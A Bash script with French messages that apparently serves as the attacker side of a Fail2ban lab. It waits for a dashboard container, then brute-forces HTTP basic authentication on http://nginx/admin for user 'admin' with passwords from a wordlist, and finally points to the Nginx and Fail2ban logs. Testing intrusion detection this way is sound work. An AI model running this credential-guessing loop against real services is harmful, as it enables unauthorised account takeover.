#!/bin/bash

TARGET="http://nginx" 
PROTECTED_PATH="/admin"
DELAY=0.01


WORDLIST="/password.txt" 


TARGET_USER="admin" 

DASHBOARD_TARGET="http://fail2ban-dashboard:5000" 
WAIT_DELAY=2  
WAIT_TIMEOUT=60 

echo "==================================================="
echo "⏳ Attente que le dashboard soit opérationnel ($DASHBOARD_TARGET)..."
echo "==================================================="

start_time=$(date +%s)
while true; do

    HTTP_CODE_DASHBOARD=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$DASHBOARD_TARGET")
    
    if [ "$HTTP_CODE_DASHBOARD" -eq 200 ]; then
        echo "✅ Dashboard opérationnel (Code 200). Lancement de l'attaque..."
        break 
    elif [ "$HTTP_CODE_DASHBOARD" = "000" ]; then
         echo "⚠️ Dashboard non joignable ou erreur de connexion (Code 000). Nouvelle tentative dans $WAIT_DELAY s..."
    else
         echo "⚠️ Dashboard joignable mais renvoie Code $HTTP_CODE_DASHBOARD. Nouvelle tentative dans $WAIT_DELAY s..."
    fi

    current_time=$(date +%s)
    elapsed_time=$((current_time - start_time))

    if [ "$elapsed_time" -ge "$WAIT_TIMEOUT" ]; then
        echo "❌ Attente dépassée ($WAIT_TIMEOUT s). Le dashboard n'est pas devenu opérationnel. Abandon de l'attaque."
        exit 
    fi

    sleep $WAIT_DELAY 

done

echo "==================================================="
echo "   Lancement de l'attaque par dictionnaire"
echo "   Cible : $TARGET$PROTECTED_PATH"
echo "   Utilisateur cible : $TARGET_USER"
echo "   Wordlist : $WORDLIST"
echo "   Délai entre tentatives : $DELAY s"
echo "==================================================="

if [ ! -f "$WORDLIST" ]; then
    echo "Erreur : Le fichier wordlist '$WORDLIST' n'existe pas !"
    exit 1
fi

ATTEMPT_COUNT=0
# Lit le fichier wordlist ligne par ligne
while IFS= read -r password; do
    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
    # Saute les lignes vides
    if [ -z "$password" ]; then
        continue
    fi

    # Couple utilisateur:motdepasse à tester
    CREDENTIALS="${TARGET_USER}:${password}"

    echo -n "🔐 Tentative $ATTEMPT_COUNT - Essai avec mot de passe : ${password} - "

    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$PROTECTED_PATH" -u "$CREDENTIALS")

    echo "Code HTTP reçu : $HTTP_CODE"

    if [ "$HTTP_CODE" -eq 200 ]; then
        echo "🎉 Mot de passe trouvé : ${password} (pour l'utilisateur ${TARGET_USER})"
        
    fi

    sleep $DELAY

done < "$WORDLIST"

echo "==================================================="
echo "🛑 Fin des tentatives (Total : $ATTEMPT_COUNT)."
echo "==================================================="

# Rappel utile
echo ""
echo "✅ Vérifiez maintenant les logs Nginx et le statut de Fail2ban."
